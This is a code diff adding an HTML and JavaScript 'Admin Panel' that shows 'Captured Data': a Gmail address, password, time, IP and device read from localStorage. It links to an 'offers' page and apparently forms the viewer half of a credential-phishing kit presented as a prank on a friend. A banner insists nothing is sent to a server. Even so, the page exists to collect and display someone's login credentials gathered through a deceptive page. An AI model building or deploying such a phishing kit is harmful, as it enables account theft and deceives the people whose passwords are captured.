@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Admin Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e17;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .admin-container {
+            max-width: 600px;
+            width: 100%;
+        }
+        .admin-box {
+            background: #0d1117;
+            color: #0f0;
+            border-radius: 16px;
+            padding: 40px;
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 50px rgba(0,255,0,0.1);
+        }
+        .admin-box h1 {
+            text-align: center;
+            font-size: 22px;
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .admin-box .dot {
+            display: inline-block;
+            width: 12px; height: 12px;
+            background: #0f0;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+        .field { margin: 15px 0; display: flex; align-items: flex-start; }
+        .label { color: #0f0; font-weight: 700; width: 120px; flex-shrink: 0; font-size: 15px; }
+        .value { color: #fff; flex: 1; word-break: break-all; font-size: 15px; }
+        .value.empty { color: #555; font-style: italic; }
+        .warning {
+            background: rgba(255,0,0,0.1);
+            border: 1px solid #ff3333;
+            color: #ff6666;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 12px;
+            text-align: center;
+        }
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .action-btn {
+            flex: 1;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 14px;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .btn-refresh { background: #0f0; color: #000; }
+        .btn-refresh:hover { background: #00cc00; }
+        .btn-clear { background: #d93025; color: white; }
+        .btn-clear:hover { background: #b71c1c; }
+        .btn-back {
+            background: #333;
+            color: white;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .btn-back:hover { background: #444; }
+
+        @media (max-width: 500px) {
+            .admin-box { padding: 25px 20px; }
+            .field { flex-direction: column; }
+            .label { width: 100%; margin-bottom: 4px; }
+        }
+    </style>
+</head>
+<body>
+<div class="admin-container">
+    <div class="admin-box">
+        <h1><span class="dot"></span> ADMIN PANEL — Captured Data <span class="dot"></span></h1>
+        
+        <div class="field"><span class="label">📧 Gmail:</span><span class="value" id="adminEmail">—</span></div>
+        <div class="field"><span class="label">🔑 Password:</span><span class="value" id="adminPassword">—</span></div>
+        <div class="field"><span class="label">🕒 Time:</span><span class="value" id="adminTime">—</span></div>
+        <div class="field"><span class="label">🌐 IP:</span><span class="value" id="adminIP">—</span></div>
+        <div class="field"><span class="label">📱 Device:</span><span class="value" id="adminDevice">—</span></div>
+
+        <div class="warning">⚠️ This data is stored only in your friend's browser localStorage. No data is sent to any server. Clear after prank.</div>
+        
+        <div class="actions">
+            <button class="action-btn btn-refresh" onclick="refreshData()">🔄 Refresh</button>
+            <button class="action-btn btn-clear" onclick="clearData()">🗑️ Clear All</button>
+        </div>
+        <a href="offers.html" class="btn-back">← Go to Offers Page</a>
+    </div>
+</div>
+
+<script>
+function refreshData() {
+    document.getElementById('adminEmail').textContent = localStorage.getItem('capturedEmail') || '—';
+    document.getElementById('adminPassword').textContent = localStorage.getItem('capturedPassword') || '—';
+    document.getElementById('adminTime').textContent = localStorage.getItem('capturedTime') || '—';
+    document.getElementById('adminIP').textContent = localStorage.getItem('capturedIP') || '—';
+    document.getElementById('adminDevice').textContent = localStorage.getItem('capturedDevice') || '—';
+    
+    const emptyFields = document.querySelectorAll('.value');
+    emptyFields.forEach(function(el) {
+        if(el.textContent === '—') { el.classList.add('empty'); }
+        else { el.classList.remove('empty'); }
+    });
+}
+
+function clearData() {
+    if(confirm('Are you sure you want to clear all captured credentials?')) {
+        localStorage.removeItem('capturedEmail');
+        localStorage.removeItem('capturedPassword');
+        localStorage.removeItem('capturedTime');
+        localStorage.removeItem('capturedIP');
+        localStorage.removeItem('capturedDevice');
+        localStorage.removeItem('attemptMade_');
+        refreshData();
+        alert('✅ All data cleared successfully!');
+    }
+}
+
+refreshData();
+</script>
+</body>
+</html>
